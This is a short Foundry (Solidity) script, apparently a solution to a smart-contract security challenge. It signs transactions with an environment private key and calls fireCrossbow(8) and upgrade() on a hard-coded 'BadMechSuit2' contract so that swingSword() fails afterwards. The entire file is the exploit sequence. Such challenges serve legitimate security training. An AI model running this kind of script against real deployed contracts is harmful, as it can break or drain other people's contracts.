// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackBadMechSuit2 is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        BadMechSuit2 target = BadMechSuit2(
            0xA271D8A5BA99B692bfE5AdBC29074f37329fFe17
        );

        vm.startBroadcast(privateKey);
        target.fireCrossbow(8);
        target.upgrade();
        // target.swingSword(); // This should fail after the previous 2 calls
        vm.stopBroadcast();
    }
}

interface BadMechSuit2 {
    function upgrade() external;

    function fireCrossbow(uint times) external returns (bytes32);

    function swingSword() external view returns (bytes32);
}
